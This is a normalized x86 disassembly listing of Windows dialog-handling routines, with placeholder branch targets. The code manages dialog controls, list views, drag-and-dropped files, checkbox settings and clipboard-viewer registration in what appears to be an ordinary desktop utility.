mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x42c
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x42d
push esi
call edi
push eax
call ebx
push 0x0
push 0x42e
push esi
call edi
push eax
call ebx
push 0x0
push 0x434
push esi
call edi
push eax
call ebx
push 0x0
push 0x426
push esi
call edi
push eax
call ebx
push 0x0
push 0x430
push esi
call edi
push eax
call ebx
push 0x0
push 0x42f
push esi
call edi
push eax
call ebx
push 0x0
push 0x433
push esi
call edi
push eax
call ebx
mov eax 0x427
jmp r-xdata
mov eax 0x425
jmp r-xdata
push 0x0
push 0x1
push 0x111
push esi
call [ PostMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
mov ecx [ ebp + 0x214 ]
call sub_404ac0
push eax
push 0x34
push 0x3
push 0xf3
push esi
call sub_420e20
add esp 0x14
cmp eax 0x7
je r-xdata
mov ecx [ ebp + 0x214 ]
mov al [ ecx + 0x21 ]
test al al
je r-xdata
push 0x0
push esi
call sub_406220
mov ebp [ ebp + 0x214 ]
test ebp ebp
je r-xdata
push 0x1
push eax
push esi
call edi
mov eax [ ebp + 0x214 ]
cmp [ eax + 0x23 ] bl
jne r-xdata
push 0x1
push esi
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24c
retn 0x10
lea edx [ esp + 0x5c ]
push edx
call sub_420ac0
add esp 0x4
test eax eax
jne r-xdata
sub_40896f
add al [ edx ]
add al [ edx ]
add al [ edx ]
add [ ecx ] al
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
mov ecx rw-data
call sub_408330
retn
sub_4089a0
sub esp 0x440
push ebx
mov ebx [ SendMessageA@IAT ]
push ebp
push edi
push 0xf000
push esi
mov edi eax
push 0x102c
lea eax [ esp + 0x44 ]
push edi
mov [ esp + 0x1c ] eax
call ebx
shr eax 0xc
dec eax
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
push 0x102d
lea edx [ esp + 0x58 ]
push edi
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x38 ] 0x200
mov [ esp + 0x34 ] edx
call ebx
push 0x103
call sub_420ca0
mov ebp [ lstrcmpA@IAT ]
add esp 0x4
push eax
lea ecx [ esp + 0x50 ]
push ecx
call ebp
test eax eax
jne r-xdata
lea ecx [ esp + 0x39 ]
mov [ esp + 0x38 ] 0x53
mov [ esp + 0xc ] ecx
push 0x104
call sub_420ca0
add esp 0x4
push eax
lea edx [ esp + 0x50 ]
push edx
call ebp
test eax eax
mov eax [ esp + 0xc ]
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x45
jmp r-xdata
mov [ eax ] 0x4d
mov [ eax ] 0x55
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
inc eax
push esi
mov [ esp + 0x14 ] eax
push 0x102d
lea eax [ esp + 0x58 ]
push edi
mov [ esp + 0x28 ] 0x3
mov [ esp + 0x38 ] 0x200
mov [ esp + 0x34 ] eax
call ebx
push 0x10a
call sub_420ca0
add esp 0x4
push eax
lea edx [ esp + 0x50 ]
push edx
call ebp
test eax eax
jne r-xdata
push 0x10b
call sub_420ca0
add esp 0x4
push eax
lea eax [ esp + 0x50 ]
push eax
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x4e
jmp r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
push 0x102d
lea ecx [ esp + 0x58 ]
push edi
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x38 ] 0x200
mov [ esp + 0x34 ] ecx
call ebx
push 0x10d
call sub_420ca0
add esp 0x4
push eax
lea eax [ esp + 0x50 ]
push eax
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x4f
inc eax
mov [ esp + 0xc ] eax
push 0x10c
call sub_420ca0
add esp 0x4
push eax
lea ecx [ esp + 0x50 ]
push ecx
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x75
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
push 0x102d
lea edx [ esp + 0x58 ]
push edi
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x38 ] 0x200
mov [ esp + 0x34 ] edx
call ebx
push 0x115
call sub_420ca0
add esp 0x4
push eax
lea ecx [ esp + 0x50 ]
push ecx
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x63
inc eax
mov [ esp + 0xc ] eax
push 0x116
call sub_420ca0
add esp 0x4
push eax
lea edx [ esp + 0x50 ]
push edx
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x49
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push esi
push 0x102d
lea eax [ esp + 0x58 ]
push edi
mov [ esp + 0x28 ] 0x5
mov [ esp + 0x38 ] 0x200
mov [ esp + 0x34 ] eax
call ebx
push 0x107
call sub_420ca0
add esp 0x4
push eax
lea edx [ esp + 0x50 ]
push edx
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x42
inc eax
mov [ esp + 0xc ] eax
lea ecx [ esp + 0x10 ]
push ecx
push esi
push 0x102d
lea eax [ esp + 0x58 ]
push edi
mov [ esp + 0x28 ] 0x6
mov [ esp + 0x38 ] 0x200
mov [ esp + 0x34 ] eax
call ebx
push 0x107
call sub_420ca0
add esp 0x4
push eax
lea edx [ esp + 0x50 ]
push edx
call ebp
test eax eax
mov eax [ esp + 0xc ]
jne r-xdata
mov eax [ esp + 0xc ]
mov [ eax ] 0x4b
inc eax
mov [ esp + 0xc ] eax
lea ecx [ esp + 0x10 ]
push ecx
push esi
mov [ eax ] 0x0
push 0x102d
lea eax [ esp + 0x58 ]
mov ebp 0x200
push edi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] eax
call ebx
lea eax [ esp + 0x10 ]
push eax
push esi
push 0x102d
lea edx [ esp + 0x258 ]
push edi
mov [ esp + 0x28 ] 0x7
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] edx
call ebx
lea ecx [ esp + 0x24c ]
push ecx
lea edx [ esp + 0x50 ]
push edx
lea edi [ esp + 0x40 ]
call sub_407d30
add esp 0x8
pop edi
pop ebp
pop ebx
add esp 0x440
retn
mov [ eax ] 0x51
inc eax
sub_408ca0
mov eax [ esp + 0x8 ]
sub esp 0x240
cmp eax 0x110
push ebx
push ebp
push esi
push edi
mov ebx ecx
jg r-xdata
cmp eax 0x111
je r-xdata
je r-xdata
movzx eax [ esp + 0x25c ]
cmp eax 0x7d2
jg r-xdata
cmp eax 0x233
jne r-xdata
mov eax [ esp + 0x254 ]
push 0x686
push eax
call [ GetDlgItem@IAT ]
lea ecx [ esp + 0x40 ]
mov esi eax
push ecx
push esi
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x48 ]
sub ecx [ esp + 0x40 ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
mov ecx edx
add ecx eax
push 0x0
push esi
mov eax 0x10e
call sub_405620
push 0x1
push esi
xor ecx ecx
mov eax 0x10f
call sub_405620
mov ebp 0x2
push ebp
push esi
xor ecx ecx
mov eax 0x114
call sub_405620
push 0x3
push esi
xor ecx ecx
mov eax 0x111
call sub_405620
push 0x4
push esi
xor ecx ecx
mov eax 0x112
call sub_405620
push 0x5
push esi
xor ecx ecx
mov eax 0x118
call sub_405620
push 0x6
push esi
xor ecx ecx
mov eax 0x119
call sub_405620
mov eax [ esp + 0x78 ]
mov ecx [ esp + 0x80 ]
sub ecx eax
push 0x7
push esi
mov eax 0x113
call sub_405620
add esp 0x40
push 0x24
push 0x0
push 0x1036
push esi
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
mov [ ebx + 0x214 ] ecx
mov eax [ rw-data ]
xor edi edi
test eax eax
je r-xdata
cmp eax 0x4e
je r-xdata
sub eax 0x7d3
je r-xdata
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
mov edx [ esp + 0x254 ]
push 0x686
push edx
call [ GetDlgItem@IAT ]
push 0x0
push 0x0
mov edi eax
push 0x1004
push edi
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x25c ]
push 0x200
mov esi eax
lea eax [ esp + 0x54 ]
push eax
push 0x0
push ecx
mov [ esp + 0x20 ] 0x0
call [ DragQueryFileA@IAT ]
test eax eax
jbe r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x102b
push esi
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebp
call [ SendMessageA@IAT ]
push esi
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
mov ecx [ ebx + 0x214 ]
push edi
push esi
call sub_404790
mov edx [ ebx + 0x214 ]
mov eax [ edx + 0x4 ]
inc edi
test eax eax
mov [ ebx + 0x214 ] eax
jne r-xdata
cmp [ esp + 0x25c ] 0x686
jne r-xdata
cmp eax 0x53
jne r-xdata
mov eax [ esp + 0x254 ]
push 0x686
push eax
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
mov edi eax
push 0x1004
push edi
call ebx
mov ebp eax
call sub_4055e0
lea edx [ esp + 0x18 ]
push edx
mov esi eax
push esi
push 0x102d
lea ecx [ esp + 0x5c ]
push edi
mov [ esp + 0x30 ] 0x4
mov [ esp + 0x40 ] 0x200
mov [ esp + 0x3c ] ecx
call ebx
push 0x10d
call sub_420ca0
add esp 0x4
push eax
lea eax [ esp + 0x54 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov ebp [ esp + 0x254 ]
push 0x686
push ebp
call [ GetDlgItem@IAT ]
mov edi eax
call sub_4055e0
mov esi eax
mov eax edi
call sub_4089a0
push 0x1
push r-xdata
push ebp
push 0x38b
mov [ ebx + 0x214 ] eax
mov [ ebx + 0x21c ] 0x0
call sub_420d20
add esp 0x10
test eax eax
je r-xdata
cmp eax 0x687
jg r-xdata
mov eax [ esp + 0x25c ]
push eax
call [ DragFinish@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
mov ebp 0x2
mov ecx [ esp + 0x260 ]
mov eax [ ecx + 0x8 ]
add eax 0x9b
cmp eax 0x98
ja r-xdata
mov eax [ esp + 0x254 ]
push 0x709
push eax
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x240
retn 0x10
push 0x0
push esi
push 0x1008
push edi
call ebx
lea ecx [ esi + 0x1 ]
cmp ecx ebp
jne r-xdata
mov eax [ esp + 0x254 ]
push 0x686
push eax
call [ GetDlgItem@IAT ]
mov edi eax
call sub_4055e0
mov esi eax
mov eax edi
call sub_4089a0
push 0x0
push esi
push 0x1008
push edi
mov [ ebx + 0x214 ] eax
call [ SendMessageA@IAT ]
lea ecx [ esi - 0x1 ]
push ecx
mov ecx [ ebx + 0x214 ]
push edi
call sub_404790
dec esi
dec eax
jne r-xdata
push 0x0
push esi
push 0x1008
push edi
call [ SendMessageA@IAT ]
mov ecx [ ebx + 0x214 ]
push esi
push edi
call sub_404790
lea eax [ esp + 0x18 ]
push eax
jmp r-xdata
cmp eax 0x7d1
jne r-xdata
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x25c ]
push 0x200
lea ecx [ esp + 0x54 ]
inc eax
push ecx
push eax
push edx
mov [ esp + 0x20 ] eax
call [ DragQueryFileA@IAT ]
test eax eax
ja r-xdata
mov ecx [ ebx + 0x214 ]
push esi
push edi
call sub_404790
lea ecx [ esp + 0x18 ]
push ecx
push esi
push 0x102b
push edi
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebp
call [ SendMessageA@IAT ]
mov ecx [ ebx + 0x214 ]
inc esi
test ecx ecx
mov [ esp + 0x14 ] ecx
je r-xdata
movzx edx [ eax + lookup_table_409468 ]
jmp [ edx * 4 + jump_table_409458 ]
mov ebp 0x2
mov [ esp + 0x28 ] ebp
mov [ esp + 0x24 ] ebp
dec esi
mov ecx ebx
call sub_4061e0
push ebx
call j_sub_429931
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
mov ecx [ esp + 0x254 ]
push 0x686
push ecx
call [ GetDlgItem@IAT ]
mov edi eax
call sub_4055e0
mov ebp eax
mov esi ebp
mov eax edi
call sub_4089a0
push 0x0
push ebp
push 0x1008
push edi
mov [ ebx + 0x214 ] eax
call [ SendMessageA@IAT ]
mov ecx [ ebx + 0x214 ]
lea esi [ ebp + 0x1 ]
push esi
push edi
call sub_404790
jmp r-xdata
push esi
push 0x102b
mov ebp 0x2
push edi
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebp
call [ SendMessageA@IAT ]
mov ebx [ ebx + 0x214 ]
test ebx ebx
je r-xdata
mov ebp [ esp + 0x254 ]
push 0x686
push ebp
call [ GetDlgItem@IAT ]
mov edi eax
call sub_4055e0
mov esi eax
xor eax eax
push eax
push r-xdata
push ebp
push 0x38b
mov [ ebx + 0x214 ] eax
mov [ ebx + 0x21c ] eax
call sub_420d20
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x254 ]
push 0x686
xor edi edi
push ecx
mov [ esp + 0x18 ] edi
call [ GetDlgItem@IAT ]
push edi
push edi
mov ebp eax
push 0x1009
push ebp
mov [ esp + 0x24 ] ebp
call [ SendMessageA@IAT ]
lea edx [ esp + 0x10 ]
push edx
mov ecx ebx
call sub_408130
mov esi [ esp + 0x10 ]
cmp esi edi
je r-xdata
dec eax
mov ebp [ esp + 0x254 ]
je r-xdata
mov eax [ esp + 0x254 ]
push ebp
push r-xdata
push eax
lea edx [ esp + 0x5c ]
push 0x38b
mov [ ebx + 0x21c ] edx
mov [ ebx + 0x214 ] 0x0
call sub_420d20
add esp 0x10
test eax eax
je r-xdata
call sub_4061e0
mov edx [ esp + 0x14 ]
push edx
call j_sub_429931
add esp 0x4
mov esi [ esp + 0x254 ]
call sub_406710
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
movzx eax [ ecx + 0xc ]
add eax 0xfffffff8
cmp eax 0x26
ja r-xdata
lea edx [ esp + 0x18 ]
push edx
mov ecx [ ebx + 0x214 ]
inc esi
push esi
push edi
call sub_404790
jmp r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x102b
mov ebp 0x2
push ecx
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebp
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
jmp r-xdata
mov eax [ ebx + 0x224 ]
test eax eax
je r-xdata
dec eax
je r-xdata
movzx eax [ eax + lookup_table_409514 ]
jmp [ eax * 4 + jump_table_409504 ]
mov [ ebx + 0x214 ] esi
mov ecx [ ebx + 0x214 ]
mov esi [ esi + 0x4 ]
push edi
push ebp
call sub_404790
mov ebp [ ebx + 0x214 ]
inc edi
test ebp ebp
je r-xdata
call sub_408030
push 0x686
push ebp
call [ GetDlgItem@IAT ]
push 0x0
push 0x0
mov edi eax
push 0x1004
push edi
call [ SendMessageA@IAT ]
mov esi eax
dec esi
js r-xdata
push eax
call [ DestroyWindow@IAT ]
push 0x0
push ebp
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
mov ecx [ esp + 0x254 ]
push 0x686
push ecx
call [ GetDlgItem@IAT ]
mov edi eax
call sub_4055e0
mov ebx [ SendMessageA@IAT ]
push 0xf000
mov esi eax
push esi
push 0x102c
push edi
mov [ esp + 0x38 ] 0xf000
call ebx
shr eax 0xc
dec eax
neg eax
sbb eax eax
and eax 0x1000
add eax 0x1000
mov [ esp + 0x24 ] eax
jmp r-xdata
test esi esi
jne r-xdata
mov ecx ebp
call sub_4061e0
push ebp
call j_sub_429931
add esp 0x4
mov ecx ebx
call sub_4056b0
mov ecx ebx
call sub_406620
test eax eax
je r-xdata
mov eax edi
call sub_4089a0
dec esi
mov [ ebx + 0x214 ] eax
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov edx [ ebx + 0x214 ]
mov [ rw-data ] edx
jns r-xdata
lea edx [ esp + 0x18 ]
push edx
push esi
push 0x102b
push edi
call ebx
mov ebp [ esp + 0x14 ]
jmp r-xdata
push 0x1
push ebp
call [ EndDialog@IAT ]
mov eax [ rw-data ]
push eax
push 0xf0
push ebx
call sub_4057e0
add esp 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x240
retn 0x10
sub_409540
mov eax [ ecx + 0x224 ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
push 0x0
push sub_4081f0
push eax
push 0x397
call sub_420cd0
add esp 0x10
retn 0x4
mov [ esp + 0x4 ] eax
jmp [ SetForegroundWindow@IAT ]
sub_409570
sub esp 0xc
push esi
push edi
push 0x1
mov edi ecx
push 0x0
push r--data
mov ecx rw-data
mov [ esp + 0x14 ] edi
call sub_425ab0
push eax
call sub_420db0
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x10 ] esi
je r-xdata
mov ecx [ rw-data ]
mov edx [ edi + 0x220 ]
push ecx
push 0x30
push 0x4
push 0xc7
push edx
call sub_420e20
add esp 0x14
push rw-data
mov ecx edi
call sub_408130
mov ecx edi
call sub_406620
cmp [ esi ] 0x12bc3e76
jne r-xdata
mov al [ esi + 0x4 ]
add esi 0x4
test al al
je r-xdata
mov ecx edi
call sub_4056b0
mov eax [ esp + 0x10 ]
push eax
call sub_429931
add esp 0x4
pop edi
pop esi
add esp 0xc
retn
push ebx
push ebp
mov ebp [ lstrlenA@IAT ]
jmp r-xdata
push esi
mov [ esp + 0x18 ] esi
call ebp
lea edi [ eax + esi + 0x1 ]
push edi
call ebp
lea ebx [ eax + edi + 0x1 ]
push ebx
call ebp
mov ecx [ esp + 0x10 ]
push 0x0
lea esi [ eax + ebx + 0x1 ]
mov eax [ esp + 0x18 ]
push eax
push ebx
push edi
push rw-data
call sub_408070
cmp [ esi ] 0x0
jne r-xdata
mov edi [ esp + 0x10 ]
pop ebp
pop ebx
jmp r-xdata
sub_409670
mov eax [ esp + 0x8 ]
sub eax 0x53
push ebx
push ebp
push esi
push edi
mov ebp ecx
je r-xdata
mov edx [ esp + 0x14 ]
push 0x708
push edx
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0xc
sub eax 0xbd
je r-xdata
mov ecx ebp
call sub_405850
movzx edx [ rw-data ]
mov esi [ esp + 0x14 ]
mov edi [ CheckDlgButton@IAT ]
push edx
push 0x461
push esi
call edi
movzx eax [ rw-data ]
push eax
push 0x462
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x465
push esi
call edi
movzx edx [ rw-data ]
push edx
push 0x467
push esi
call edi
movzx eax [ rw-data ]
push eax
push 0x468
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x466
push esi
call edi
movzx edx [ rw-data ]
push edx
push 0x46a
push esi
call edi
movzx eax [ rw-data ]
push eax
push 0x46b
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x46c
push esi
call edi
movzx edx [ rw-data ]
push edx
push 0x46d
push esi
call edi
movzx eax [ rw-data ]
push eax
push 0x46e
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x469
push esi
call edi
mov ebx [ SendDlgItemMessageA@IAT ]
xor edi edi
lea esp [ esp ]
dec eax
jne r-xdata
movsx edx [ edi * 8 + rw-data ]
push edx
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x180
push 0x460
push esi
call ebx
movzx eax [ edi * 8 + rw-data ]
push edi
push eax
push 0x185
push 0x460
push esi
call ebx
inc edi
cmp edi 0x19
jl r-xdata
push 0x0
push 0x0
push 0x197
push 0x460
push esi
call ebx
mov ebx [ EnableWindow@IAT ]
mov ebp [ GetDlgItem@IAT ]
mov edi 0x466
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
mov eax [ esp + 0x1c ]
cmp eax 0x463
jg r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
push esi
call ebp
push eax
call ebx
inc edi
cmp edi 0x469
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0xc
sub eax 0x464
je r-xdata
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov ecx ebp
call sub_409540
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
dec eax
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x0
push sub_409650
push eax
push 0x386
call sub_420d20
add esp 0x10
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
dec eax
mov esi [ esp + 0x14 ]
je r-xdata
mov edi [ esp + 0x14 ]
push 0x465
push edi
call [ IsDlgButtonChecked@IAT ]
mov ebp [ EnableWindow@IAT ]
mov ebx eax
mov esi 0x466
nop
mov edi [ IsDlgButtonChecked@IAT ]
push 0x461
push esi
call edi
push 0x462
push esi
mov [ rw-data ] al
call edi
push 0x465
push esi
mov [ rw-data ] al
call edi
push 0x467
push esi
mov [ rw-data ] al
call edi
push 0x468
push esi
mov [ rw-data ] al
call edi
push 0x466
push esi
mov [ rw-data ] al
call edi
push 0x46a
push esi
mov [ rw-data ] al
call edi
push 0x46b
push esi
mov [ rw-data ] al
call edi
push 0x46c
push esi
mov [ rw-data ] al
call edi
push 0x46d
push esi
mov [ rw-data ] al
call edi
push 0x46e
push esi
mov [ rw-data ] al
call edi
push 0x469
push esi
mov [ rw-data ] al
call edi
mov ebx [ SendDlgItemMessageA@IAT ]
mov [ rw-data ] al
xor edi edi
jmp r-xdata
dec eax
je r-xdata
push ebx
push esi
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
inc esi
cmp esi 0x469
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
push 0x0
push edi
push 0x187
push 0x460
push esi
call ebx
mov [ edi * 8 + rw-data ] al
inc edi
cmp edi 0x19
jl r-xdata
push 0x1
push esi
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
mov ecx ebp
call sub_405a70
sub_4099d0
mov eax [ esp + 0x8 ]
cmp eax 0x214
push esi
push edi
mov edi ecx
jg r-xdata
cmp eax 0x40e
jg r-xdata
je r-xdata
sub eax 0x40f
je r-xdata
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
mov ecx rw-data
call sub_4209c0
pop edi
xor eax eax
pop esi
retn 0x10
cmp eax 0x53
jg r-xdata
mov esi [ esp + 0xc ]
push 0x438
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push edx
push eax
push 0x100
push 0x438
push esi
call [ SendDlgItemMessageA@IAT ]
dec eax
jne r-xdata
mov esi [ esp + 0xc ]
push 0x438
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
push 0x102
push 0x438
push esi
call [ SendDlgItemMessageA@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
sub eax 0x308
je r-xdata
sub eax 0x110
je r-xdata
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0xc ]
push edx
push eax
push 0x286
push 0x438
push ecx
call [ SendDlgItemMessageA@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x5
jne r-xdata
mov esi [ esp + 0xc ]
push 0x44c
push 0x444
push 0x0
push rw-data
push 0x439
push esi
mov ecx rw-data
call sub_4206e0
push 0x1
push esi
mov [ edi + 0x237 ] 0x1
call sub_4258a0
mov eax [ rw-data ]
add esp 0x8
xor ecx ecx
dec eax
jne r-xdata
mov ecx [ esp + 0xc ]
push 0x700
push ecx
call sub_414bc0
add esp 0x8
pop edi
mov eax 0x1
pop esi
retn 0x10
sub eax 0x2
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
push 0x308
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x14 ]
cmp eax ecx
mov edx [ esp + 0x18 ]
jne r-xdata
mov edx 0x1
shl edx cl
test eax edx
setne dl
mov [ ecx * 8 + rw-data ] dl
inc ecx
cmp ecx 0x19
jl r-xdata
mov [ edi + 0x220 ] esi
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x10 ] ecx
jne r-xdata
movzx eax [ esp + 0x14 ]
cmp eax 0x43e
jg r-xdata
mov ecx edi
mov [ edi + 0x237 ] 0x0
call sub_405850
xor eax eax
mov [ rw-data ] eax
xor ecx ecx
jmp r-xdata
dec eax
je r-xdata
pop edi
mov [ rw-data ] 0x1
xor eax eax
pop esi
retn 0x10
mov al [ rw-data ]
test al al
je r-xdata
push edx
push ecx
push 0x30d
push eax
call [ SendMessageA@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
pop edi
mov [ rw-data ] edx
xor eax eax
pop esi
retn 0x10
push ebx
push 0x439
push esi
call [ GetDlgItem@IAT ]
push eax
mov ecx edi
call sub_40aa30
mov ecx edi
call sub_405a70
mov eax [ rw-data ]
mov edi [ SendDlgItemMessageA@IAT ]
push eax
push 0x0
push 0x405
push 0x438
push esi
call edi
push rw-data
push 0x442
push 0x411
push 0x438
push esi
mov ebx eax
call edi
push 0x0
push 0x0
push 0x402
push 0x438
push esi
call edi
push eax
push 0x0
push 0x40c
push 0x439
push esi
call edi
test ebx ebx
pop ebx
je r-xdata
mov ecx edi
call sub_409570
sub eax 0x43f
cmp eax 0x4
ja r-xdata
je r-xdata
mov dl [ ecx * 8 + rw-data ]
test dl dl
je r-xdata
mov ecx rw-data
call sub_4207d0
pop edi
xor eax eax
pop esi
retn 0x10
sub eax 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
mov [ rw-data ] 0x0
call [ SetClipboardViewer@IAT ]
pop edi
mov [ rw-data ] eax
mov eax 0x1
pop esi
retn 0x10
mov al [ rw-data ]
test al al
je r-xdata
jmp [ eax * 4 + jump_table_409ef8 ]
mov edx [ esp + 0xc ]
push edx
mov ecx edi
call sub_409540
pop edi
xor eax eax
pop esi
retn 0x10
cmp eax 0x3e7
jg r-xdata
inc ecx
cmp ecx 0x19
jl r-xdata
mov edx 0x1
shl edx cl
or eax edx
mov eax [ esp + 0x14 ]
push eax
mov ecx rw-data
call sub_420810
pop edi
xor eax eax
pop esi
retn 0x10
mov esi [ esp + 0xc ]
push 0x0
push 0x0
push 0x402
push 0x438
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx eax
call sub_405cc0
test eax eax
je r-xdata
push 0x0
push 0x3e7
push 0x111
push esi
call [ PostMessageA@IAT ]
mov ecx [ edi + 0x8 ]
push sub_405d80
call sub_40b340
pop edi
xor eax eax
pop esi
retn 0x10
mov eax [ esp + 0xc ]
push 0x0
push 0x0
push 0x412
push 0x438
push eax
call [ SendDlgItemMessageA@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ esp + 0xc ]
push 0x0
push 0x0
push 0x407
push 0x439
push ecx
call [ SendDlgItemMessageA@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx edi
call sub_405980
test eax eax
jne r-xdata
sub eax 0x439
je r-xdata
je r-xdata
mov esi [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push esi
mov [ esp + 0x18 ] ecx
call [ ChangeClipboardChain@IAT ]
push esi
call sub_4258e0
add esp 0x4
pop edi
xor eax eax
pop esi
retn 0x10
push 0x0
push 0x3e7
push 0x111
push esi
mov [ edi + 0x239 ] 0x1
call [ PostMessageA@IAT ]
mov edx [ esp + 0xc ]
push eax
push sub_4099b0
push edx
push 0x388
call sub_420d20
add esp 0x10
pop edi
xor eax eax
pop esi
retn 0x10
sub eax 0x3
jne r-xdata
mov ecx edi
call sub_406b90
pop edi
xor eax eax
pop esi
retn 0x10
dec eax
je r-xdata
mov esi [ esp + 0xc ]
push 0x43c
push esi
call [ IsDlgButtonChecked@IAT ]
neg eax
sbb al al
inc al
movzx ecx al
push ecx
push 0x43c
push esi
mov [ rw-data ] al
mov [ rw-data ] al
call [ CheckDlgButton@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
dec eax
jne r-xdata
mov al [ edi + 0x234 ]
test al al
je r-xdata
mov edi [ edi + 0x224 ]
test edi edi
je r-xdata
mov [ edi + 0x234 ] 0x2
pop edi
mov eax 0x1
pop esi
retn 0x10
mov eax [ esp + 0xc ]
push eax
call [ DestroyWindow@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
lea edx [ esp + 0x10 ]
push edx
push 0x0
push 0x40d
push edi
call [ SendMessageA@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_409f20
push esi
mov esi ecx
mov al [ esi + 0x237 ]
test al al
je r-xdata
